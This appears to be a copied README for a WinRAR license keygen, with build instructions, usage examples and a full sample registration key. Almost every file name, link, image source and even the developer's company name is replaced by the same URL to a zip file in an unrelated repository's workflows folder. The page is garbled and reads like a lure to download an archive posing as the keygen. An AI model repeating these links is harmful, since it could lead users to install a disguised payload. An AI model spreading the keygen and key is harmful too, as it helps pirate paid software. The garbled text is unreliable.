## 1. What is WinRAR?

WinRAR is a trialware file archiver utility for Windows, developed by Eugene Roshal of https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip GmbH. 

It can create and view archives in RAR or ZIP file formats and unpack numerous archive file formats. 

WinRAR is not a free software. If you want to use it, you should pay to [__RARLAB__](https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip) and then you will get a license file named `https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip`. 

This repository will tell you how WinRAR license file `"https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip"` is generated. 

## 2. How is "https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip" generated?

See [here](https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip).

## 3. How to use?

There are several ways to use it.

- [Use Github Actions](#4-Use-Github-Actions) 
- [Use Github Actions with secrets](#5-Use-Github-Actions-with-secrets)
- [Build in Visual Studio](#6-Build-in-Visual-Studio)

### 3.1 Encoding

WinRAR Keygen supports `ASCII`, `ANSI` and `UTF8NoBOM` encoding types, the corresponding supported characters are listed in the table below.

> [!NOTE]
> The default is `utf8`, but you can specify the encoding as `ascii` or `ansi`.

| Encoding                                     | Supported Characters                                         | Character Examples                                           |
| -------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| [ascii](https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip) | Only full ASCII characters are supported.                    | <img width="300px" src="https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip"><img width="300px" src="https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip"> |
| ansi                                         | There is no one fixed ANSI code, usually [Windows-1252](https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip), but other local codes are also possible. | <img width="300px" src="https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip"><img width="300px" src="https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip"> |

|     Drag to import or place in a location      |       Double-click to run automatic import       |

If you are unable to drag, you can try to put the `https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip` in the following directory.

```shell
C:\Users\yourname\AppData\Roaming\WinRAR\https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip
```

You can also compress `https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip` into `https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip` and double-click it to run it, and the license import will take place automatically.

## 4. Use Github Actions

<details>

If you get an invalid key, please check [the specific solution](#7-invalid-key).

</details>

## 6. Build in Visual Studio

<details>
<summary>Click to expand</summary>

I recommend using the Github Actions, but you can still do your own compilation.

If you don't want to compile it yourself, you can also go to the [release](https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip) page to get `https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip`.

### 6.1 Prerequisites

1. Please make sure that you have **Visual Studio 2022**. Because this is a VS2022 project. If you are still using Visual Studio 2019, you can find projects for VS2019 in the [vs2019](https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip) branch, but this branch will no longer be maintained.

2. Please make sure you have installed `vcpkg` and the following libraries:

   + `mpir:x86-windows-static`
   + `mpir:x64-windows-static`
   + `mpir:gmp:x64-windows`

   is installed.

   You can install them by:

   ```shell
   $ vcpkg install mpir:x86-windows-static
   $ vcpkg install mpir:x64-windows-static
   $ vcpkg install gmp:x64-windows
   ```

3. Your `vcpkg` has been integrated into your __Visual Studio__, which means you have run successfully.

   ```shell
   $ vcpkg integrate install
   ```
   

### 6.2 Build

1. Open this project in __Visual Studio__.

2. Select `Release` configuration.

3. Select __Build > Build Solution__.

You will see executable files in `bin/` directory. 

### 6.3 How to use?

Execute the following code in the terminal and configure two parameters to generate `https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip`.

Here is an example of ASCII encoding for `Github` and `Single PC usage license`:

```shell
Usage:
        https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip <Username> <License Name>

Example:

        https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip "Github" "Single PC usage license"
```

![Terminal](https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip)

Now you can see the newly generated file.

```console
RAR registration data
Github
Single PC usage license
UID=3a3d02329a32b63da7d8
6412212250a7d8753c5e7037d83011171578c57042fa30c506caae
9954e4853d415ec594e46017cb3db740bc4b32e47aea25db62f350
9f22065a27da4f8216d2938e1050b6e3347501a3767d1fdd7ee130
dd4ab952600ba16a99236d910bfa995d5f60651ec451f462511507
95b3722d059f2d5303a231e396cf21f17098edeec0b6e3347501a3
767d1fdd7ee45388769767642338ee8a63178f3458b71de5609b18
5eede7ed46566b10bf033daa6384062b259194b1acbd0378116064
```

Save the generated information in **ASCII encoding** as `https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip`.

### 6.4 More character support

In addition to using ASCII encoding, you can use ANSI and UTF8NoBOM to support more characters, but you will need to install [PowerShell 7.4 or later](https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip).

For example, generating a license with UTF8NoBOM encoding.

> `utf8:` is to ensure constant character representation in WinRAR across languages.

```shell
https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip "utf8:简体中文" "license" | Out-File -Encoding UTF8NoBOM https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip

## 7. Invalid key

Why is my `https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip` invalid?

### 7.1 Character encoding

`TEXT1` and `TEXT2` are required to fulfill [corresponding coding requirements](#31-Encoding).

```console
https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip <TEXT1> <TEXT2>
```

### 7.2 Text encoding

If you use the following command:

```shell
https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip "Github" "Single PC usage license" > https://github.com/lx2337037168/winrar-keygen/raw/refs/heads/master/.github/workflows/keygen-winrar-2.0-beta.2.zip
```

In the newer Windows 10 / 11, PowerShell will export in **UTF16-LE** format by default, which will cause the error.

Please use the following command:

```shell
